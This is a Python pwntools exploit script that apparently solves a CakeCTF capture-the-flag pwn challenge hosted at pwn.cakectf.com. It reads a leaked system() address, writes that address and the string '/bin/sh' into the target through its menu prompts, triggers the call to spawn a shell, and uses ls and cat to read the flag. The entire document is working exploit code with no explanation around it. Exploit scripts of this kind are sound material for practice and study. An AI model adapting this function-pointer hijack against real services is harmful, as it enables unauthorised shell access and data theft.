from pwn import *


def solve():
    io = remote('pwn.cakectf.com', 9001)
    io.recvuntil('<system> = ')

    system_address = int(io.recvline().decode().strip(), 16)

    io.sendlineafter('> ', b'3')
    io.sendlineafter('> ', b'2')
    io.sendlineafter('Message: ', p64(system_address))

    io.sendlineafter('> ', b'2')
    io.sendlineafter('Message: ', b'/bin/sh')

    io.sendlineafter('> ', b'1')

    io.sendline(b'ls')
    io.recvline()
    io.recvline()
    flag_txt = io.recvline().decode().strip()

    io.sendline(b'cat ' + flag_txt.encode())
    flag = io.recvline().decode().strip()

    io.sendline(b'exit')
    io.close()

    return flag


if __name__ == '__main__':
    print(solve())
